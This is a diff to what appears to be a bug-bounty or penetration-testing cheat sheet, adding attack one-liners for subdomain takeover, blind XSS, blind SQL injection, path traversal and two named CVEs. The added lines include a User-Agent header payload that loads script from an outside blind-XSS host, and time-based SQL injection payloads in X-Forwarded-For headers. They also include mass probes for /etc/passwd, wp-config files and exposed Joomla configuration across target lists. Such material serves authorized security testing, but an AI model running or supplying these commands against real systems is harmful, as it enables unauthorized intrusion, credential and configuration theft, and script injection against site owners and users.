@@ -96,6 +96,7 @@ templates/exposures -t /root/nuclei-templates/sqli.yaml
 ------------------------------------------------------------------------------------------------------
 Subdomain takeover 
 1- use Subjack => https://github.com/haccer/subjack
+	subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/cybertix/subjack/fingerprints.json -v 3 >> takeover ;
 2- use SubOver => https://github.com/Ice3man543/SubOver
 3- Subzy => https://github.com/LukaSikic/subzy
 	-- subzy run --targets live-subs.txt
@@ -299,7 +300,7 @@ Information Disclosure
 	- /app_dev.php/_profiler
 	- Look for "profiler token" in phpinfo()
 
-
+- shodan search org: "Target" http.favicon.hash:116323821 --fields ip_str,port--separator | awk '{print $1 $2}'
 
 -----------------------------------------------------------------------------------------------------
 XXE
@@ -664,6 +665,7 @@ Blind XSS
 inurl:"contact-form"
 	## Go to xss.report website and create an account to test for blind xss Vulnerbilitites
 2- Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+3- cat domain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>"
 
 -----------------------------------------------------------------------------------------------------------------------------------------------
 Signup
@@ -1110,10 +1112,24 @@ batch --random-agent --level 1 | tee sqlmap.txt
 11- sqlmap -r request.txt --ignore-code 401
 
 
+------------------------------------------------------------------------------------------------------
+Blind Sqli
+1- https://github.com/SAPT01/HBSQLI	=> automated blind sqli scanner
+	- python3 hbsqli.py -l y.txt -p payloads.txt -H headers.txt -v
+	- python3 hbsqli.py -u "https://target.com" -p payloads.txt -H headers.txt -v
+2- cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
 
 
 
 -------------------------------------------------------------------------------------------------------------------------------------------------
+path traversal 
+httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
+
+
+
+
+-------------------------------------------------------------------------------------------------
+
 2FA bypass
 1- change "success":false	to "success":true
 2- change 400 bad request 	to 200 Ok 
@@ -1219,8 +1235,12 @@ Httpx
 
  cat iplist| httpx -silent -path /xmlrpc.php -title -match-string "XML-RPC" ==> then search exploit xmlrpc
 - httpx -l live_subs.txt --status-code --title -mc 200 -path /phpinfo.php
+- httpx -L live_subs.txt -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "/wp-config.PHP" -mc 200 -t 60 -status-code
 - httpx -l live_subs.txt --status-code --title -mc 200 -path /composer.json
-
+-CVE 2023-23752
+subfinder -d http://TARGET.COM -silent -all | httpx -silent -path 'api/index.php/v1/config/application?public=true' -mc 200 
+-CVE 2023-29489
+subfinder -d http://example.com -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path '/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaaaaa' -mc 400
 -------------------------------------------------------------------------------------------------------
 Burpsuite
 1-search for =>  Request.Query CONTAINS "=https"	==> for open redirect 
